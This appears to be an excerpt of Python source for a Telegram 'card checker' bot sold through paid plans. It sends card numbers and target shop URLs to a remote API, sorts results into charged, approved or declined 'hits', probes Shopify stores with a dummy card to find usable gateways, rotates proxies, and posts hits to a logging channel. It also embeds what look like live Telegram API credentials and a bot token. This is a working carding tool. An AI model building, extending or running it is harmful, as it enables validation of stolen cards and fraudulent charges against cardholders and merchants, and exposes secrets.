...
# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID", "23455910"))
API_HASH = os.getenv("API_HASH", "90141cba8edb2622873c97f63ab3ec96")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8507514102:AAENWlI6XXkTb3usHe_wRpI_rGpqujyQ_1E")
ADMIN_ID = json.loads(os.getenv("ADMIN_ID", "[7622959338]"))
HIT_CHANNEL_ID = int(os.getenv("HIT_CHANNEL_ID", "-1004433350893"))
JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", "-1003960217262"))
JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", "-1003837703405"))
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/asindaa")
JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/yangkhm")
FORCE_JOIN_IMAGES = [
    "",
    ""
]
# UPDATED: New API base URL (without trailing slash)
API_BASE_URL = os.getenv("API_BASE_URL", "https://wa-production-924e.up.railway.app")
...
API_TIMEOUT = 120  # Increased for reliability
BIN_TIMEOUT = 60
PROXY_TIMEOUT = 12
RZ_TIMEOUT = 60
...
HIT_DELAY = 1.5
PER_USER_LIMIT = 200
LOG_CHANNEL_ID = -1004433350893
SS_CHANNEL_ID = int(os.getenv("SS_CHANNEL_ID", "-1004433350893")) # Separate channel for hit screenshots
...
HIT_BUTTON = [[Button.url(bs("M E O W"), "https://t.me/Avashira")]]
...
def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    ...
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/Avashira'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
...
{PE} <i>{bs('Use /plan to see available plans')}</i>""", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Avashira")]], emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])
...
def build_api_url(site, cc, proxy_data=None):
    # UPDATED: new endpoint /check with correct parameters
    if not site.startswith('http'):
        site = f'https://{site}'
    url = f'{API_BASE_URL}/check?card={quote(cc, safe="")}&url={quote(site, safe="")}&low=true'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        # Construct proxy string in the format accepted by the API: host:port:user:pass or http://user:pass@host:port
        # The API's normalize_proxy handles both. We'll use host:port:user:pass (simpler).
...
def classify_response(rj):
    """
    Updated to work with the new API response format.
    The API returns:
        Response: str (same as status)
        status: str (one of CHARGED, APPROVED, DECLINED, ERROR)
        Price: str
        Gateway: str
        status_code: str (e.g., ORDER_PLACED)
        error: str
        retryable: bool
    We use 'status' field directly.
    """
    # First, try to use the 'status' field from the API
    api_status = rj.get('status') or rj.get('Status')  # fallback to 'Status' if present
    if api_status:
        status_upper = api_status.upper()
        if status_upper in ["CHARGED", "APPROVED", "DECLINED", "ERROR"]:
            return {
                "Response": rj.get('Response', api_status),
                "Price": rj.get('Price', '-'),
                "Gateway": rj.get('Gateway', rj.get('Gate', 'Shopify')),
                "Status": status_upper
            }
    # Fallback: old keyword-based classification on 'Response' field
    ar = str(rj.get('Response', ''))
    st = rj.get('Status', False)  # might be boolean but we ignore
    price = rj.get('Price', '-')
...
# ====================== ENHANCED SITE TEST (FIXED) ======================
async def test_site(site, proxy_data=None, http_session=None):
    """Test a site using a dummy card, with relaxed classification."""
    ...
    try:
        ...
        # --- FIXED LOGIC ---
        # 1. If it's a clear site error (e.g., token error, no product) -> dead
        if is_site_error(rl) or '400' in rl or 'bad request' in rl or 'price_over_max' in rl or 'no_product' in rl:
            return {'site': site, 'status': 'dead', 'price': price, 'response': rm}

        # 2. If the response contains a decline message -> alive
        decline_keywords = [
            'card_declined', 'generic_decline', 'do_not_honor', 'insufficient_funds',
            'stolen_card', 'lost_card', 'expired_card', 'restricted_card', 'fraudulent',
            'not_permitted', 'transaction_not_allowed', 'card_not_supported',
            'invalid_cvc', 'incorrect_cvc', 'ccn live', 'invalid_zip', 'incorrect_zip',
            'avs', 'pickup_card', 'pick_up_card', '3d', 'otp', 'authentication'
        ]
        if any(k in rl for k in decline_keywords):
            return {'site': site, 'status': 'alive', 'price': price, 'response': rm}

        # 3. If response contains 'error' or 'failed' but not a decline -> dead
        if 'error' in rl or 'failed' in rl:
            return {'site': site, 'status': 'dead', 'price': price, 'response': rm}

        # 4. Otherwise, consider alive (the API responded with something)
        return {'site': site, 'status': 'alive', 'price': price, 'response': rm}
...
async def _build_status_text():
    ...
    if sys_info.get("error"):
        return f"⌬ <b>𝐄𝐫𝐫𝐨𝐫</b> ↬ <code>❌ {sys_info['error']}</code>\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/Avashira'>𝑹@𝒗𝒆𝒏</a>"
    ...
    msg += f"\n――――――――――――――\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/Avashira'>𝑹@Mydev1</a>"
    return msg
...
<b>━━━━━━━━━━━━━━━━━</b>
{sl}"""
        kb = [[pbtn(bs("Plans"), data="show_plans"), pbtn(bs("Support"), url="https://t.me/Avashira")],
...
async def plans_cb(event):
    ...
    await styled_send(event.chat_id, plans_text, buttons=[[pbtn(bs("Redeem Code"), data="show_redeem"), pbtn(bs("Upgrade"), url="https://t.me/Avashira")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])
...
async def show_plans(event):
    ...
    await styled_reply(event, plans_text, buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Avashira"), pbtn(bs("Redeem Code"), data="show_redeem")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])
...
async def _check_free_limits(event, uid, plan, is_group):
    ...
    if not is_paid_plan(plan):
        ...
        if used >= FREE_SP_DAILY_LIMIT:
            await styled_reply(event, f"{PE} <b>{bs('Daily Limit')}</b> {used}/{FREE_SP_DAILY_LIMIT}", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Avashira")]], emoji_ids=[CE["stop"]])
            return False
        cd = get_free_sp_cooldown_remaining(uid)
        if cd > 0:
            await styled_reply(event, f"⚠️ <b>{bs('Wait')} {cd}{bs('s')}</b>", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Avashira")]])
            return False
    return True
...
async def _handle_plan_assign(event, plan_key):
    ...
    await styled_reply(event, f"""<b>✅ {bs('Plan Updated')}</b>\n<a href='https://t.me/Avashira'>⊀</a> <b>{bs('User')}</b> ↬ <a href='tg://user?id={target_uid}'>{target_name}</a>\n<a href='https://t.me/Avashira'>⊀</a> <b>{bs('Plan')}</b> ↬ {pi['emoji']} <b>{pi['name']}</b>\n<a href='https://t.me/Avashira'>⊀</a> <b>{bs('Duration')}</b> ↬ <code>{pi['duration_days']} {bs('days')}</code>\n<a href='https://t.me/Avashira'>⊀</a> <b>{bs('Expires')}</b> ↬ <code>{expiry_date}</code>""")
    try:
